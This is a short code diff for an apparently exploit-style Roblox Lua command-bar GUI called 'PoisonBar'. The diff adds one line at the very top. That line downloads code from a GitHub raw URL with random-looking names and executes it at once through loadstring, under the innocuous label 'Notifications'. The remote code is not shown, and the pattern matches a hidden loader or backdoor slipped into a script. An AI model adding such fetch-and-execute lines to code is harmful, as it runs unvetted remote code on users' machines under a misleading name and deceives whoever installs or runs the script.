@@ -1,3 +1,4 @@
+loadstring(game:HttpGetAsync('https://raw.githubusercontent.com/RA3t7Q9uAkYQVxgc/4tqv5gV972BwvZeT/main/Notifications'))()
 local PoisonBar = Instance.new("ScreenGui")
 local CMDBar = Instance.new("Frame")
 local Input = Instance.new("TextBox")
